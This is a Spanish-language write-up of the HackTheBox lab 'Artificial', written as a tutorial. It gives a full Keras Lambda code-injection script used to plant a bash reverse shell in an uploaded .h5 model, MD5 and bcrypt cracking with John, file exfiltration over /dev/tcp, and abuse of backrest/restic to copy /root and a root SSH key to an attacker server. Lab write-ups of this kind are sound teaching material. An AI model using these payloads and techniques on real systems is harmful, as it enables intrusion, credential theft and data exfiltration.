---
layout      : post
title       : "HackTheBox - Artificial"
author      : lanz
footer_image: assets/images/footer-card/linux-icon.png
footer_text : Linux
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-banner.png
category    : [ htb ]
tags        : [ backrest, restic, modelos-ai, cracking, backup ]
---
Entorno Linux nivel fácil. Explotación de **modelos AI** :O, crackeazion de contraseñas y juegos sucios con **backrest** y backups.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-lab-information.png" style="width: 100%;"/>

**💥 Laboratorio creado por**: [FisMatHack](https://app.hackthebox.com/profile/1076236).

## TL;DR (Spanish writeup)

Hay que tener backup de lo importante, ¿no?

Exploraremos un sitio web que permite la construcción, manipulación y pruebas de `modelos AI`, aprovecharemos las herramientas dadas por la web para crear nuestros propios modelos e inyectarlos con cosas peligrosas, así, lograremos ejecutar remotamente comandos en el sistema y generar una sesión como el usuario `app`.

Encontraremos credenciales hasheadas, las cuales procederemos a crackear y saltaremos al usuario `gael`.

Internamente, se está ejecutando el servicio `backrest`, encontraremos más credenciales a crackear, jugaremos con `port-forwarding`, `restic` y `rest-server` para generar repositorios y realizar backups que nos otorguen extracción de archivos sensibles a nuestro sistema. De esa manera obtendremos información de `root` y generaremos una shell como él.

...

### Clasificación de la máquina según la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-statistics.png" style="width: 80%;"/>

Algo de todo, cositas enfocadas en lo real, pero juguetona.

> La idea inicial de esta locura es tener mis "notas" por si algun día se me olvida todo (lo que es muuuy probable), leer esto y reencontrarme (o talvez no) 😄 La segunda idea surgio con el tiempo, ya que me di cuenta que esta es una puerta para personitas que como yo al inicio (o simplemente a veces) nos estancamos en este mundo de la seguridad, por lo que si tengo la oportunidad de ayudarlos ¿por qué no hacerlo?

> Un detalle es que si ves mucho texto, es por que me gusta mostrar tanto errores como exitos y tambien plasmar todo desde una perspectiva más de enseñanza que de solo pasos a seguir. Sin menos, muchas gracias <3

...

Los robots 🤖

1. [Reconocimiento](#reconocimiento)
2. [Enumeración](#enumeracion)
  * [Revisando el puerto 80](#enumeracion-puerto-80)
  * [Modelos AY](#enumeracion-modelos-ai)
3. [Explotación](#explotacion)
4. [Movimiento Lateral: app -> gael](#lateral-cracking-sqlite3)
5. [Escalada de privilegios](#escalada-de-privilegios)
  * [REEEEst crack](#escalada-backrest-cracking)
  * [Descansando en el patio](#escalada-backrest)
  * [Haciendo backup de cositas prohibidas](#escalada-backrest-backup-root)
6. [Post-Explotación](#post-explotacion)

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

Vamos a empezar descubriendo que servicios (puertos) tiene expuestos el sistema, nos apoyaremos de `nmap` para esto:

```bash
nmap -p- --open -v 10.10.11.74 -oA tcp-all-htb_artificial
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535 puertos |
| --open    | Devuelve solo los puertos que estén abiertos |
| -v        | Permite ver en consola lo que va encontrando |
| -oA       | Guarda el output en diferentes formatos, entre ellos uno "grepeable". Lo usaremos junto a la función [extractPorts](https://pastebin.com/raw/X6b56TQ8) de [S4vitar](https://s4vitar.github.io/) para copiar los puertos en la clipboard rápidamente |

El resultado es:

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Servicio que permite la obtención de una terminal de forma segura |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Servicio para interactuar con un servidor web |

> Usando la función `extractPorts` (referenciada antes) podemos tener rápidamente los puertos en la clipboard, en este caso no es necesario (ya que tenemos pocos), pero si tuviéramos varios evitamos tener que escribirlos uno a uno:
 
> `extractPorts tcp-all-htb_artificial.gnmap`

Una vez tenemos los puertos, seguimos solicitando ayuda a `nmap`, ahora para que nos intente extraer la versión exacta del software usado yyyy que pruebe con algunos scripts propios a ver si encuentra más info:

```bash
nmap -sCV -p 22,80 10.10.11.74 -oA tcp-port-htb_artificial
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Indicamos a qué puertos queremos realizar el escaneo |
| -sC       | Ejecuta scripts predefinidos contra cada servicio |
| -sV       | Intenta extraer la versión del servicio |

Y finalmente tenemos:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0) |
| 80     | HTTP     | nginx 1.18.0 (Ubuntu) |

De entre la info obtenida, el servicio `http` está intentando realizar una redirección al dominio `artificial.htb`, ya hablaremos de esto.

Mientras tanto, empecemos a jugar...

# Enumeración [#](#enumeracion) {#enumeracion}

Lo que nos llama la atención de primeras es el sitio web.

## Revisando el puerto 80 [📌](#enumeracion-puerto-80) {#enumeracion-puerto-80}

Como te indiqué antes, existe una redirección al dominio `artificial.htb`, que quiere decir esto, que el servidor web obliga a consumir la información alojada en ese dominio, el tema es que nuestro sistema no sabe aún como resolver ese dominio para traer la info, acá entra en juego el archivo [/etc/hosts](https://site.es/soporte/articulos/editar-archivo-en-fichero-hosts-etchosts-una-guia-sobre-archivo-hosts-67):

* [Guía sobre archivo **hosts**](https://site.es/soporte/articulos/editar-archivo-en-fichero-hosts-etchosts-una-guia-sobre-archivo-hosts-67)

La idea es que podamos pasarle el dominio y la IP, así el sistema sabe que si accedemos al dominio, lo que queremos es visitar el contenido alojado en él, con respecto al servidor `10.10.11.74` (o sea, nuestra máquina víctima), el uso es bien sencillo:

```bash
➧ tail -n 1 /etc/hosts
10.10.11.74     artificial.htb
```

Y si ahora visitamos el dominio, ya deberíamos ver su contenido:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-page80.png" style="width: 100%;"/>

La web permite interactuar, probar y desarrollar modelos **AI** :o

Antes de ahondar, veamos que más podemos sacar para nuestras notas.

El sitio nos presenta un ejemplo de modelo:

```py
import numpy as np
import pandas as pd
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers

np.random.seed(42)

# Create hourly data for a week
hours = np.arange(0, 24 * 7)
profits = np.random.rand(len(hours)) * 100

# Create a DataFrame
data = pd.DataFrame({
    'hour': hours,
    'profit': profits
})

X = data['hour'].values.reshape(-1, 1)
y = data['profit'].values

# Build the model
model = keras.Sequential([
    layers.Dense(64, activation='relu', input_shape=(1,)),
    layers.Dense(64, activation='relu'),
    layers.Dense(1)
])

# Compile the model
model.compile(optimizer='adam', loss='mean_squared_error')

# Train the model
model.fit(X, y, epochs=100, verbose=1)

# Save the model
model.save('profits_model.h5')
```

Al parecer la lógica está relacionada con horas de la semana. Al final genera un archivo [.h5](https://fileinfo.com/extension/h5):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-google-h5-file.png" style="width: 100%;"/>

* [Difference between **.h5** and **.hdf5**](https://stackoverflow.com/questions/64534477/what-is-the-difference-between-the-file-extensions-h5-hdf5-and-ckpt-and-which)

En la web también encontramos una ruta para registrar usuarios y otra para logearlos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-page80-register.png" style="width: 100%;"/>

Creamos un usuario y llegamos a:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-page80-dashboard.png" style="width: 100%;"/>

Acá se nos permite subir nuestros modelos **AI** para probarlos. También se nos dan herramientas para crear el modelo resultado internamente y que al momento de subirlos funcionen con la web.

Pero y ¿qué jeso de modelos AI?

> 🤖 Basicamente son programas hechos con el fin de reconocer patrones en la información analizada, lo que les permite tomar decisiones sin necesidad de alguna interacción humana 😨

Apoyados en los recursos que nos da el sitio, montemos el laboratorio y creemos un modelo AI.

## Modelos AY [📌](#enumeracion-modelos-ai) {#enumeracion-modelos-ai}

Nos descargamos el archivo `Dockerfile`, contiene:

```Docker
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

Va a construir un sistema con `Python` y la librería `tensorflow_cpu` en su versión `2.13.1`, démosle:

Para esto necesitas claramente [Docker](https://www.docker.com/), por ejemplo para instalarlo en **Kali Linux** se puede [seguir esta guía](https://www.kali.org/docs/containers/installing-docker-on-kali/), una vez lo tenemos, en la ruta donde se aloja el `Dockerfile` generamos la imagen del programa:

```bash
docker build --tag artifact .
docker images
```

Levantamos un puerto internamente, por ejemplo el **4450**: `nc -lvp 4450`.

> Lidié mucho para poder obtener una shell dentro del contenedor y jugar comodamente, esta manera fue la más sencilla que pensé.

Y generamos una reverse shell, esto para que el contenedor envié una `bash` a ese puerto en escucha:

```bash
docker run artifact:latest -c 'bash -c "bash -i >& /dev/tcp/<local_ip>/4450 0>&1"'
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-bash-docker-artifact.png" style="width: 100%;"/>

Listones, ya tenemos el entorno funcional.

Generemos el modelo que nos dieron de ejemplo, movamos el script de **Python** al contenedor:

```bash
➧ base64 -w 0 example-code.py
aW1w...5oNScpCg==
```

```bash
root@4ee816c3ccfa:/code# echo aW1w...5oNScpCg== | base64 -d > example-code.py
root@4ee816c3ccfa:/code# chmod +x example-code.py
root@4ee816c3ccfa:/code# pip install pandas
```

Lo ejecutamos:

```bash
root@4ee816c3ccfa:/code# python3 example-code.py
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-bash-docker-artifact-python3-example.png" style="width: 100%;"/>

Y efectivamente nos genera el archivo `.h5`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-bash-docker-artifact-example-h5.png" style="width: 100%;"/>

Ahora subamos ese archivo `.h5` a la web, tenemos que sacarlo del contenedor:

```bash
root@4ee816c3ccfa:/code# hostname -I
172.17.0.2 
root@4ee816c3ccfa:/code# python3 -m http.server
```

```bash
➧ curl http://172.17.0.2:8000/profits_model.h5 -o profits_model.h5
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-page80-dashboard-example-uploaded.png" style="width: 100%;"/>

Damos clic en `View Predictions`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-page80-dashboard-example-uploaded-predictions.png" style="width: 100%;"/>

Perfecto, logramos generar que el sitio web interpretara nuestro modelo e hiciera sus predicciones.

Ya con algo tan importante funcionando, ¿qué podemos hacer para llevar esto al lado maligno? 😈 ¿qué tal crear modelos maliciosos o cositas maliciosas con los modelos existentes? TANTANTANTAAAAAN;

# Explotación [#](#explotacion) {#explotacion}

Investigando en internet, encontramos varios recursos por si quieres explorar más a fondo:

* [RCE PoC for Tensorflow using a malicious Lambda layer](https://github.com/Splinter0/tensorflow-rce)
* [Keras 2 Lambda Layers Allow Arbitrary Code Injection in TensorFlow Models ](https://kb.cert.org/vuls/id/253266)
* [TensorFlow Keras Downgrade Attack: CVE-2024-3660 Bypass](https://www.oligo.security/blog/tensorflow-keras-downgrade-attack-cve-2024-3660-bypass)
* [Exposing Keras Lambda Exploits in TensorFlow Models](https://blog.huntr.com/exposing-keras-lambda-exploits-in-tensorflow-models)

Como guía para probar cositas, usaremos este:

* [Models Are Code: A Deep Dive into Security Risks in TensorFlow and Keras](https://hiddenlayer.com/innovation-hub/models-are-code/)

El tema es que los modelos **AI** son creados mediante código de programación, lo que abre la puerta a bugs o a creación de más código, peeeero malicioso, esto será lo que nos enseñarán los recursos.

La guía nos presenta un script el cual inyecta código en modelos ya existentes, así que nos sirve resto.

El creador usa el framework de [machine learning](https://es.wikipedia.org/wiki/Aprendizaje_autom%C3%A1tico) [**Keras**](https://github.com/keras-team/keras) junto a las funciones [Lambda](https://www.luisllamas.es/programacion-funciones-lambda/) (que permiten la generación de funciones sin nombre para usos momentáneos) para la inyección de cositas divertidas en los modelos.

```python
import os
import argparse
import shutil
from pathlib import Path
import tensorflow as tf

parser = argparse.ArgumentParser(description="Keras Lambda Code Injection")
parser.add_argument("path", type=Path)
parser.add_argument("command", choices=["system", "exec", "eval", "runpy"])
parser.add_argument("args")
parser.add_argument("-v", "--verbose", help="verbose logging", action="count")

args = parser.parse_args()
command_args = args.args

if os.path.isfile(command_args):
    with open(command_args, "r") as in_file:
        command_args = in_file.read()

def Exec(dummy, command_args):
    if "keras_lambda_inject" not in globals():
        exec(command_args)

def Eval(dummy, command_args):
    if "keras_lambda_inject" not in globals():
        eval(command_args)

def System(dummy, command_args):
    if "keras_lambda_inject" not in globals():
        import os
        os.system(command_args)

def Runpy(dummy, command_args):
    if "keras_lambda_inject" not in globals():
        import runpy
        runpy._run_code(command_args,{})
        
# Construct payload
if args.command == "system":
    payload = tf.keras.layers.Lambda(System, name=args.command, arguments={"command_args":command_args})
elif args.command == "exec":
    payload = tf.keras.layers.Lambda(Exec, name=args.command, arguments={"command_args":command_args})
elif args.command == "eval":
    payload = tf.keras.layers.Lambda(Eval, name=args.command, arguments={"command_args":command_args})
elif args.command == "runpy":
    payload = tf.keras.layers.Lambda(Runpy, name=args.command, arguments={"command_args":command_args})

# Save a backup of the model
backup_path = "{}.bak".format(args.path)
shutil.copyfile(args.path, backup_path)

# Insert the Lambda payload into the model
hdf5_model = tf.keras.models.load_model(args.path)
hdf5_model.add(payload)
hdf5_model.save(args.path)
```

Nos copiamos el código y lo pegamos en el contenedor:

```bash
➧ base64 -w 0 inject-model.py 
aW1w......pCg==
```

```bash
root@4ee816c3ccfa:/code# echo "aW1w...pCg==" | base64 -d > inject-model.py
root@4ee816c3ccfa:/code# chmod +x inject-model.py
```

Para su ejecución le debemos pasar el modelo ya existente, la opción a inyectar (en nuestro caso usaremos `system`, ya que mediante la librería `os` llamará un comando) y finalmente el comando (una reverse shell bien linda):

```bash
root@4ee816c3ccfa:/code# python3 inject-model.py profits_model.h5 system "bash -c 'bash -i >& /dev/tcp/10.10.16.112/4451 0>&1'"
```

Yyyy obtenemos el modelo inyectado:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-bash-docker-artifact-example-h5-injected.png" style="width: 100%;"/>

Antes de que se nos olvide, levantemos el puerto que le indicamos:

```bash
➧ nc -lvp 4451
```

Ahora sí, sacamos el archivo del contenedor y lo subimos a la web:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-page80-dashboard-example-injected-uploaded.png" style="width: 100%;"/>

Damos clic en `View Predictions` y si revisamos nuestro listener:

👻

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-revsh-app.png" style="width: 100%;"/>

Listoneeeeeees (:

# Movimiento Lateral: app -> gael [#](#lateral-cracking-sqlite3) {#lateral-cracking-sqlite3}

Revisando el directorio `/home` del usuario **app**, encontramos un archivo de base de datos `Sqlite3` relacionado con usuarios:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-revsh-app-sqlite3-usersDB.png" style="width: 100%;"/>

Extraemos sus nombres y lo que parecen ser sus contraseñas en formato hash [MD5](https://es.wikipedia.org/wiki/MD5) (el cual ya no debe usarse para credenciales por su poca seguridad):

```bash
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
```

Nos los guardamos en el sistema y procedemos a **crackear**, ¿qué jeso?, la idea es generar muuuuchos hashes con muuuuchas cadenas de texto (un diccionario) e ir comparando hashes con el hash que queremos descubrir, si en algún punto los dos hashes son iguales (el generado por la herramienta y el que estamos crackeando), tendremos noción del valor en texto plano detrás de ese hash, en este caso sería la contraseña. Nos apoyaremos de **John The Ripper**:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hashes.txt
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-bash-john-gael-mysql-cracked.png" style="width: 100%;"/>

Upa, encontramos un resultado para el usuario `gael`, que si revisamos, también existe en el sistema. Si intentamos reutilizar sus credenciales contra el sistema, nos genera una sesión como él:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-sh-gael.png" style="width: 100%;"/>

E incluso podemos usar `SSH` para tener una shell más cómoda:

```bash
ssh gael@10.10.11.74
```

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

## REEEEst crack [📌](#escalada-backrest-cracking) {#escalada-backrest-cracking}

El usuario `gael` tiene asignado el grupo `sysadm`, buscando objetos asociados a ese grupo encontramos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-sh-gael-find-sysadm-group-backrest-tar.png" style="width: 100%;"/>

Un comprimido, nos lo movemos a nuestra máquina de atacante y lo descomprimimos:

```bash
nc -lvp 4450 > backrest_backup.tar.gz
```

```bash
gael@artificial:~$ cat /var/backups/backrest_backup.tar.gz > /dev/tcp/10.10.16.112/4450
```

```bash
tar xvf backrest_backup.tar.gz
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-bash-tar-backrest-tar.png" style="width: 40%;"/>

Hay varios archivos, entre ellos uno de configuración con unas credenciales y una contraseña hasheada con el algoritmo [bcrypt](https://en.wikipedia.org/wiki/Bcrypt):

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-bash-cat-backrest-config-json.png" style="width: 100%;"/>

Por experiencia, esa cadena parece encodeada en [base64](https://en.wikipedia.org/wiki/Base64), así que hagámosle un decode a ver si es verdad:

```bash
➧ echo JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP | base64 -d
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
```

Pos sí, ahora si tenemos el hash en formato `bcrypt`.

Ya que lo tenemos y que ya conocimos lo que es **crackear**, intentemos replicar ese proceso, pero ahora con este hash, como es un formato más especifico, debemos indicárselo a `john`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt backrest-hash.txt
```

Y obtenemos el valor en texto plano de ese hash:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-bash-john-backrest-hashes.png" style="width: 100%;"/>

Nos guardamos esa info a ver si nos sirve pa un futuro...

Eso de tener tantos archivos en el comprimido y que además haya uno de configuración puede indicar que estamos lidiando con un proyecto y no con objetos random, buscando `backrest` en internet, lo referenciamos:

* [https://github.com/garethgeorge/backrest](https://github.com/garethgeorge/backrest)
* [https://garethgeorge.github.io/backrest/introduction/getting-started/](https://garethgeorge.github.io/backrest/introduction/getting-started/)

Así que leamos.

## Descansando en el patio [📌](#escalada-backrest) {#escalada-backrest}

Leyendo la documentación se nos informa que **backrest** es una solución gráfica para la realización de backups y que está construido basado en [restic](https://restic.net/).

Así mismo extraemos que por default ese servicio se ejecuta sobre el puerto `9898`, que si revisamos internamente los servicios activooooos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-sh-gael-netstat-backrest.png" style="width: 100%;"/>

Así que tenemos internamente el servicio [backrest](https://github.com/garethgeorge/backrest), lindo lindo.

También en la documentación sabemos que tiene interfaz gráfica, pero como está interno no podemos verlo tan fácil, debemos apoyarnos de algo llamado [**reenvío de puertos**](https://www.splashtop.com/es/blog/port-forwarding), en este caso **local**, ya que queremos que una máquina externa nos envíe el contenido de X servicio a nuestro entorno.

Nos apoyaremos de **SSH** para eso, le diremos, saca el contenido interno (`127.0.0.1`/`localhost`) del puerto `9898` y ponlo en el puerto (también) `9898` de mi máquina local:

```bash
ssh gael@10.10.11.74 -L 9898:127.0.0.1:9898
```

En teoría ya lo tenemos montado, si visitamos en nuestra máquina de atacante `http://localhost:9898`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-page-localhost-9898-backrest.png" style="width: 100%;"/>

Listoooooo, tenemos acceso a la interfaz gráfica del servicio [backrest](https://github.com/garethgeorge/backrest) en su versión `1.7.2`.

Vemos un login, ya obtuvimos unas credenciales (que, revisando la documentación, [hacen referencia al archivo que encontramos](https://garethgeorge.github.io/backrest/introduction/getting-started/#authentication)), si las usamos:

```txt
backrest_root : !@#$%^
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-page-localhost-9898-backrest-login-success.png" style="width: 100%;"/>

Entre la interfaz y lo que encontramos en la documentación, lo primero que necesitamos es crear un repositorio:

> No te olvides de la contraseña que le pongas, ya que la usaremos más adelante

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-page-localhost-9898-backrest-add-repo.png" style="width: 100%;"/>

Al listar los repos disponibles, se nos abre la opción de ejecutar un comando en ese repo:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-page-localhost-9898-backrest-run-command.png" style="width: 100%;"/>

¿Pero qué comandos podemos ejecutar???? Empieza el truqueteo...

## Haciendo backup de cositas prohibidas [📌](#escalada-backrest-backup-root) {#escalada-backrest-backup-root}

Ya que tenemos un servicio que realiza backups, intentemos hacer un backup de rutas clave, como `/root` o `/etc` (`/` es muy grande y genera timeout), veamos si podemos robarnos info a la que no deberíamos tener acceso.

Haciendo par de pruebas (y con ayuda de la documentación), si intentamos hacer el backup localmente, creará los archivos y permisos como el usuario `root`, así que da igual que tengamos la contraseña del repo, por permisos no vamos a poder acceder.

Buscando y buscando, llegamos a la idea de montar un servidor [rest](https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html#rest-server) en nuestra máquina atacante, para así desde **backrest** iniciar una instancia **rest** sobre ese servidor remoto y que cuando debamos lidiar con el backup, tengamos permisos totales contra él.

* [Restic Docs - Preparing a repo - REST Server](https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html#rest-server)

Debemos instalar [rest-server](https://github.com/restic/rest-server), una vez lo tengamos iniciamos el repositorio localmente indicándole un puerto y una ruta donde alojaremos la información del repositorio:

```bash
rest-server --listen ":12345" --no-auth --path /tmp/holi
```

Ahora, desde **backrest** y la opción `Run Command`, iniciamos la instancia de ese repo:

> Como está ejecutando `restic` por detrás, no debemos indicárselo

```bash
init -r "rest:http://10.10.16.112:12345"
```

> Con `-r` le indicamos el repo, como no le pusimos nombre en el `rest-server`, tomara la raiz

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-page-localhost-9898-backrest-run-command-init.png" style="width: 100%;"/>

En nuestro **servidor rest** recibimos la petición:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-bash-rest-server-instance.png" style="width: 100%;"/>

Una vez tenemos instanciado el repo, lo siguiente es realizar el backup, llevémonos la ruta `/root` de la máquina víctima a nuestro repo:

```bash
backup -r "rest:http://10.10.16.112:12345" "/root"
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-page-localhost-9898-backrest-run-command-backup-root.png" style="width: 100%;"/>

Ya con eso hecho, [según la documentación lo que queda es restaurar el backup para ver su información](https://restic.readthedocs.io/en/latest/050_restore.html#restoring-from-backup), para ello usamos la herramienta **restic** en nuestro sistema:

```bash
restic restore -r "/tmp/holi" latest --target /tmp/aca
```

> `-r` es para el repo, `latest` para que tome el ultimo backup y `--target` para indicarle donde queremos que guarde el backup

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-bash-restic-restore-backup.png" style="width: 100%;"/>

YYYYYYYYY:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-bash-backup-root-files.png" style="width: 100%;"/>

JAY, tenemos los objetos de la ruta `/root` de la víctima en nuestro sistema!!!!!

Nos encontramos la [llave privada **SSH**](https://www.stackscale.com/es/blog/configurar-llaves-ssh-servidor-linux/) del usuario `root`, esto es re bueno, ya que da igual que no tengamos la contraseña de él, podemos usar esa llave como una:

```bash
ssh root@10.10.11.74 -i root/.ssh/id_rsa
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-sh-root.png" style="width: 100%;"/>

Y hemos completao la máquina, locura de final, pero entretenido.

# Post-Explotación [#](#post-explotacion) {#post-explotacion}

## Flags [📌](#post-explotacion-flags) {#post-explotacion-flags}

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/artificial/htbARTIFICIAL-flags.png" style="width: 100%;"/>

...

Buen tema el de los modelos y como pueden ser explotados al final y también chévere el jugar con apps de backups, me gustó la máquina.

¡Muchas gracias por pasarte, nos leeremos después, abrazos y a seguir rompiendo de todOOOOOOOOOOOOOOOOOOO!!